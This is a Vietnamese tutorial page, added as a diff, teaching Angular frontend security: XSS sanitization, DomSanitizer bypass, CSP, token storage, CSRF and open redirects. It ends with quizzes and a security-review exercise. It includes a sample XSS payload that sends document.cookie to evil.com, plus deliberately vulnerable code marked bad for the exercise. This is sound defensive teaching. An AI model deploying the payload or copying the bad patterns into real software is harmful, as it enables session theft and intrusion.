@@ -1,0 +1,177 @@
+<h2>Ranh giới đầu tiên: frontend không bảo vệ được gì</h2>
+<p>Mọi thứ chạy trên trình duyệt đều do người dùng kiểm soát: họ đọc được JavaScript, sửa được request, gọi thẳng API. Guard, ẩn nút theo quyền, validate form là <b>trải nghiệm</b>, không phải bảo mật. Bảo mật thật nằm ở server. Phần của frontend là: <b>không tạo ra lỗ hổng mới</b> (XSS), bảo vệ phiên đăng nhập, và không làm lộ dữ liệu.</p>
+
+<h2>Angular chống XSS mặc định</h2>
+<pre lang="ts">
+comment = signal('<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"> Bài làm tốt');
+</pre>
+<pre lang="html">
+<p>{{ comment() }}</p>             <!-- hiện nguyên văn chữ, không chạy được -->
+<p [innerHTML]="comment()"></p>    <!-- Angular sanitize: bỏ onerror, giữ thẻ img an toàn -->
+</pre>
+<pre lang="out" file="Console của trình duyệt (chế độ phát triển)" sim="1">
+WARNING: sanitizing HTML stripped some content, see https://angular.dev/best-practices/security#xss
+</pre>
+<table>
+<tr><th>Ngữ cảnh</th><th>Angular làm gì</th></tr>
+<tr><td>Interpolation <code>{{ }}</code>, <code>[textContent]</code></td><td>escape: luôn là chữ</td></tr>
+<tr><td><code>[innerHTML]</code></td><td>sanitize HTML: bỏ script, thuộc tính sự kiện, link <code>javascript:</code></td></tr>
+<tr><td><code>[href]</code>, <code>[src]</code></td><td>sanitize URL: chặn <code>javascript:</code>, giữ http(s), mailto, data ảnh</td></tr>
+<tr><td><code>[style]</code></td><td>sanitize style</td></tr>
+<tr><td>Template</td><td>được biên dịch lúc build, người dùng không chèn được template (khác với ghép chuỗi HTML)</td></tr>
+</table>
+<aside class="fe"><p>Vue: <code>{{ }}</code> cũng escape, nhưng <code>v-html</code> <b>không sanitize gì cả</b>, bạn phải tự dùng DOMPurify. Angular sanitize sẵn cho <code>[innerHTML]</code>. Ngược lại, Angular có cửa hậu <code>bypassSecurityTrust...</code> mà bạn phải cẩn thận.</p></aside>
+
+<h3>DomSanitizer và bypass</h3>
+<pre lang="ts" mark="bad">
+// ✘ Lấy HTML người dùng nhập rồi bypass: mở toang XSS
+this.html = this.sanitizer.bypassSecurityTrustHtml(userInput);
+// ✘ URL do người dùng nhập
+this.link = this.sanitizer.bypassSecurityTrustResourceUrl(userUrl); // <iframe [src]="link">
+</pre>
+<pre lang="ts" mark="good">
+// ✓ Chỉ bypass dữ liệu do chính bạn tạo, đã kiểm tra: ví dụ URL nhúng video từ danh sách cho phép
+const id = parseYoutubeId(input);          // chỉ lấy đúng 11 ký tự [A-Za-z0-9_-]
+if (id) this.embed = this.sanitizer.bypassSecurityTrustResourceUrl(`https://www.youtube.com/embed/${id}`);
+</pre>
+<p>Quy tắc khi review code: mọi dòng có <code>bypassSecurityTrust</code> phải trả lời được "giá trị này có thể chứa dữ liệu người dùng không?". Có thì phải lọc trước, tốt nhất là không dùng.</p>
+<aside class="warn"><p>Những chỗ Angular <b>không</b> bảo vệ: <code>ElementRef.nativeElement.innerHTML = ...</code>, <code>document.write</code>, thư viện bên ngoài nhận HTML (trình soạn thảo, thư viện markdown), <code>eval</code> / <code>new Function</code>. Với nội dung giàu định dạng do người dùng nhập, dùng DOMPurify rồi mới đưa vào.</p></aside>
+
+<h2>Content Security Policy</h2>
+<p>CSP là lớp phòng thủ thứ hai: kể cả khi kẻ xấu chèn được script, trình duyệt từ chối chạy.</p>
+<pre lang="http" file="header từ server / CDN">
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://files.sobaitap.vn; connect-src 'self' https://api.sobaitap.vn; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
+</pre>
+<p>Với Angular cần lưu ý:</p>
+<ul>
+<li>Bản build mặc định "inline critical CSS" sinh một đoạn script nội tuyến nhỏ. Với <code>script-src 'self'</code> chặt, tắt nó: <code>"optimization": { "styles": { "inlineCritical": false } }</code>, hoặc dùng nonce (<code>ngCspNonce</code> / <code>CSP_NONCE</code>) khi có SSR.</li>
+<li>Không thêm <code>&lt;script&gt;</code> nội tuyến vào <code>index.html</code>, đưa ra file <code>.js</code> trong <code>public/</code>.</li>
+<li>Trusted Types: Angular hỗ trợ (<code>require-trusted-types-for 'script'; trusted-types angular angular#unsafe-bypass</code>), chặn thêm các đường XSS qua DOM.</li>
+</ul>
+
+<h2>Lưu thông tin đăng nhập ở đâu</h2>
+<table>
+<tr><th>Cách</th><th>XSS đọc trộm được?</th><th>CSRF?</th><th>Đánh giá</th></tr>
+<tr><td>Token trong <code>localStorage</code>, gửi qua header</td><td>Có: script độc đọc được token</td><td>Không</td><td>Phổ biến nhưng rủi ro khi có XSS</td></tr>
+<tr><td>Cookie <code>HttpOnly; Secure; SameSite=Lax</code></td><td>Không đọc được</td><td>Phải chống (SameSite giúp phần lớn)</td><td><b>Khuyên dùng</b> cho ứng dụng cùng tên miền với API</td></tr>
+<tr><td>Token trong bộ nhớ (biến) + refresh token cookie HttpOnly</td><td>Khó hơn</td><td>Thấp</td><td>Tốt cho SPA gọi API khác tên miền</td></tr>
+</table>
+<p>Với cookie, Angular có sẵn cơ chế chống CSRF: nếu server đặt cookie <code>XSRF-TOKEN</code>, HttpClient tự đọc và gửi lại header <code>X-XSRF-TOKEN</code> cho request thay đổi dữ liệu cùng origin.</p>
+<pre lang="ts">
+provideHttpClient(withXsrfConfiguration({ cookieName: 'XSRF-TOKEN', headerName: 'X-XSRF-TOKEN' }))
+</pre>
+
+<h2>Những lỗi bảo mật hay gặp trong ứng dụng Angular</h2>
+<table>
+<tr><th>Lỗi</th><th>Cách đúng</th></tr>
+<tr><td>Dựa vào guard / ẩn nút để chặn quyền</td><td>server kiểm tra quyền mọi API</td></tr>
+<tr><td>Để API key bí mật trong <code>environment.ts</code></td><td>mọi thứ trong bundle đều công khai; key bí mật chỉ ở server</td></tr>
+<tr><td><code>[innerHTML]</code> + <code>bypassSecurityTrustHtml</code> với dữ liệu người dùng</td><td>không bypass; dùng DOMPurify nếu cần HTML giàu định dạng</td></tr>
+<tr><td>Chuyển hướng theo <code>?next=</code> bất kỳ</td><td>chỉ nhận đường dẫn nội bộ bắt đầu bằng <code>/</code> và không phải <code>//</code></td></tr>
+<tr><td>Log token / dữ liệu cá nhân ra console, gửi lên công cụ theo dõi lỗi</td><td>lọc trước khi log</td></tr>
+<tr><td>Source map công khai trên production</td><td>tắt hoặc chỉ tải lên công cụ theo dõi lỗi</td></tr>
+<tr><td>Thư viện có lỗ hổng</td><td><code>npm audit</code>, Dependabot / Renovate, cập nhật Angular đều đặn</td></tr>
+</table>
+<pre lang="ts" file="core/safe-next.ts">
+export function safeNext(next: string | null | undefined, fallback = '/'): string {
+  // chỉ cho phép đường dẫn nội bộ: '/lop/5' được, '//evil.com' và 'https://evil.com' không
+  return next && next.startsWith('/') && !next.startsWith('//') && !next.startsWith('/\\') ? next : fallback;
+}
+</pre>
+
+<h2>Header bảo mật cho ứng dụng tĩnh</h2>
+<pre lang="text" file="public/_headers (Netlify / Cloudflare Pages)">
+/*
+  Content-Security-Policy: default-src 'self'; script-src 'self'; ...
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: strict-origin-when-cross-origin
+  Permissions-Policy: camera=(self), geolocation=()
+  Strict-Transport-Security: max-age=31536000; includeSubDomains
+  X-Frame-Options: DENY
+</pre>
+
+<quiz q="Hiển thị nhận xét có định dạng do giáo viên nhập bằng trình soạn thảo (có thể có thẻ b, i, a). Cách an toàn?">
+- bypassSecurityTrustHtml rồi [innerHTML]
++ [innerHTML] trực tiếp (Angular sanitize), hoặc DOMPurify rồi [innerHTML] nếu cần kiểm soát chặt hơn
+- Gán nativeElement.innerHTML
+? [innerHTML] tự sanitize. bypass và nativeElement bỏ qua mọi bảo vệ.
+</quiz>
+<quiz q="Đặt khoá API của dịch vụ AI vào environment.prod.ts để gọi thẳng từ trình duyệt. Có ổn không?">
+- Ổn vì file được build và nén
++ Không: mọi thứ trong bundle ai cũng đọc được. Gọi qua backend của bạn
+- Ổn nếu đặt tên biến khó đoán
+? Bundle JavaScript là công khai. Bí mật chỉ được nằm ở server.
+</quiz>
+
+<h2>Bài tập</h2>
+<details class="ex"><summary>Rà soát bảo mật một component</summary>
+<p>Tìm và sửa 4 vấn đề bảo mật trong component dưới đây.</p>
+<pre lang="ts" mark="bad">
+@Component({
+  selector: 'app-profile',
+  template: `
+    <h2 [innerHTML]="bioHtml"></h2>
+    <a [href]="website">Website</a>
+    <button (click)="goNext()">Tiếp tục</button>
+  `,
+})
+export class Profile {
+  private sanitizer = inject(DomSanitizer);
+  private route = inject(ActivatedRoute);
+  bioHtml: SafeHtml = '';
+  website: SafeUrl = '';
+
+  constructor() {
+    inject(UserApi).me().subscribe((u) => {
+      this.bioHtml = this.sanitizer.bypassSecurityTrustHtml(u.bio);       // 1
+      this.website = this.sanitizer.bypassSecurityTrustUrl(u.website);    // 2
+      localStorage.setItem('token', u.accessToken);                        // 3
+      console.log('user', u);
+    });
+  }
+
+  goNext() {
+    location.href = this.route.snapshot.queryParamMap.get('next') ?? '/'; // 4
+  }
+}
+</pre>
+<p><b>Gợi ý từng bước</b></p>
+<ol class="steps">
+<li><code>u.bio</code> và <code>u.website</code> là dữ liệu người dùng tự nhập.</li>
+<li>Token: có cần lưu ở frontend không? Nếu dùng cookie HttpOnly thì không.</li>
+<li><code>next</code> có thể là <code>https://trang-gia-mao.com</code> hoặc <code>javascript:...</code>.</li>
+<li>Log cả object người dùng (có token) ra console.</li>
+</ol>
+<details class="sol"><summary>Xem lời giải</summary>
+<pre lang="ts" mark="good">
+@Component({
+  selector: 'app-profile',
+  template: `
+    <h2 [innerHTML]="bio()"></h2>                         <!-- Angular tự sanitize -->
+    @if (website(); as w) { <a [href]="w" rel="noopener noreferrer" target="_blank">Website</a> }
+    <button (click)="goNext()">Tiếp tục</button>
+  `,
+})
+export class Profile {
+  private route = inject(ActivatedRoute);
+  private router = inject(Router);
+  private me = toSignal(inject(UserApi).me());
+  protected bio = computed(() => this.me()?.bio ?? '');
+  protected website = computed(() => {
+    const w = this.me()?.website ?? '';
+    return /^https?:\/\//i.test(w) ? w : null;           // chỉ http(s)
+  });
+
+  goNext() {
+    this.router.navigateByUrl(safeNext(this.route.snapshot.queryParamMap.get('next')));
+  }
+}
+</pre>
+<ol>
+<li><b>XSS qua bio</b>: bỏ <code>bypassSecurityTrustHtml</code>, để Angular sanitize.</li>
+<li><b>URL độc</b>: <code>bypassSecurityTrustUrl</code> cho phép <code>javascript:</code>. Bỏ bypass, chỉ nhận http(s), thêm <code>rel="noopener noreferrer"</code> khi mở tab mới.</li>
+<li><b>Token trong localStorage và log ra console</b>: server nên dùng cookie HttpOnly, frontend không cần chạm token. Không log object chứa dữ liệu nhạy cảm.</li>
+<li><b>Open redirect</b>: <code>next</code> có thể đưa người dùng sang trang giả mạo ngay sau khi đăng nhập. Chỉ chấp nhận đường dẫn nội bộ qua <code>safeNext</code>, điều hướng bằng router.</li>
+</ol>
+</details>
+</details>
